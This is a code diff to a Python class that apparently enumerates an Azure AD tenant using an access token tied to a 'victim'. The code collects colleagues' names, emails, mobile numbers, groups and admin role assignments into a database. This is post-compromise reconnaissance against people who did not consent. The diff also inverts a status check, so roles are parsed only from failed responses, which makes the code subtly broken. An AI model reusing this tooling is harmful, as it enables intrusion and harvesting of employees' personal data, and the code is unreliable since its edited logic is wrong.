@@ -73,42 +73,34 @@ class azureAdEnum():
         surname           = data['surname']
         userPrincipalName = data['userPrincipalName']
         Id                = data['id']
-        response = azureAdEnum.apiCall(uuid, f"/rolemanagement/directory/roleAssignments?$filter=principalId+eq+'{Id}'", 'GET', None, "", accessToken)
-        if response.status_code != 200:
-            return
+        
+        
         groups = ""
         usersGroup_res = azureAdEnum.apiCall(uuid, "/users/"+Id+"/memberOf", 'GET', None, "", accessToken).json()
-        for group in usersGroup_res["value"]:
-            try:
-                if group["@odata.type"] == "#microsoft.graph.group":
-                    name  = group["displayName"]
-                    groups = groups + "\r\n" + name
-            except:
-                pass
+        if "value" in usersGroup_res:
+            for group in usersGroup_res["value"]:
+                try:
+                    if group["@odata.type"] == "#microsoft.graph.group":
+                        name  = group["displayName"]
+                        groups = groups + "\r\n" + name
+                except:
+                    pass
         usersGroups       = groups[2:]
 
         roles = ""
-        response = response.json()
-        for data in response["value"]:
-            id = data["roleDefinitionId"]
-            for search in listAdroles:
-                if id in search["id"]:
-                    roles = roles + "\r\n" + search["role"]
+        response = azureAdEnum.apiCall(uuid, f"/rolemanagement/directory/roleAssignments?$filter=principalId+eq+'{Id}'", 'GET', None, "", accessToken)
+        if response.status_code != 200:
+            response = response.json()
+            if "value" in response:
+                for data in response["value"]:
+                    id = data["roleDefinitionId"]
+                    for search in listAdroles:
+                        if id in search["id"]:
+                            roles = roles + "\r\n" + search["role"]
 
-        insertColleagues = azureAdEnumeratedUsers(uuid=uuid,
-                        id=Id,
-                        victim=victim,
-                        displayName=displayName,
-                        givenName=givenName,
-                        jobTitle=jobTitle,
-                        mail=mail, 
-                        mobilePhone=mobilePhone,
-                        officeLocation=officeLocation,
-                        preferredLanguage=preferredLanguage,
-                        surname=surname,
-                        userPrincipalName=userPrincipalName,
-                        roles=roles,
-                        usersGroups=usersGroups)
+        insertColleagues = azureAdEnumeratedUsers(uuid=uuid,id=Id,victim=victim,displayName=displayName,givenName=givenName,jobTitle=jobTitle,mail=mail, 
+                        mobilePhone=mobilePhone,officeLocation=officeLocation,preferredLanguage=preferredLanguage,surname=surname,userPrincipalName=userPrincipalName,
+                        roles=roles, usersGroups=usersGroups)
         db.session.add(insertColleagues)
         time.sleep(2)
         db.session.commit()
@@ -287,10 +279,11 @@ class azureAdEnum():
             id = user["id"]
             adminroles = []
             assignments = azureAdEnum.apiCall(uuid, f"/rolemanagement/directory/roleAssignments?$filter=principalId+eq+'{id}'", 'GET', None, "", accessToken).json()
-            for role in assignments["value"]:
-                roleDefinitionId = role["roleDefinitionId"]
-                if roleDefinitionId in adminRoles:
-                    adminroles.append(adRoles[roleDefinitionId] + " : " + roleDefinitionId)
+            if "value" in assignments:
+                for role in assignments["value"]:
+                    roleDefinitionId = role["roleDefinitionId"]
+                    if roleDefinitionId in adminRoles:
+                        adminroles.append(adRoles[roleDefinitionId] + " : " + roleDefinitionId)
 
             if adminroles != []:
                 adminName = user['userPrincipalName']
@@ -541,7 +534,6 @@ class azureAdEnum():
         except:
             return "error", "Access Token Expired!"
         try:
-            print("started")
             azureAdEnum.flushPreviousdata(uuid, victim)
             azureAdEnum.userProfile(uuid, accessToken, victim)
             threading.Thread(target=azureAdEnum.enum, args=(uuid, accessToken, victim)).start()
